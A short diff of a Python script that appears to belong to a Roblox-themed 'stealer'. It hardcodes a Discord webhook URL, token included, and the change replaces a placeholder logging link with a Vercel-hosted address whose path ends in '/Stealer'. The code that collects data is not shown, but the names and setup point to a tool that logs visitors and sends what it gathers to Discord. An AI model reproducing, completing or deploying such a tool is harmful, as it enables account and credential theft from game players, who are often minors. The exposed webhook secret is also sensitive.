@@ -8,7 +8,7 @@ import base64
 
 # === CONFIGURATION ===
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1403034711357521951/3ENMQHsXdrmRF4y_bD0khVkPIGlQfz2moJzub5sudmCq73Kj-7gnO66_9ax92YuoUoo0"
-LOGGING_URL = "https://your-logging-link.com"  # Hosted link for logging visits
+LOGGING_URL = "https://roblox-delta-pearl.vercel.app/Stealer"  # Hosted link for logging visits
 
 def send_discord_message(content):
     data = {
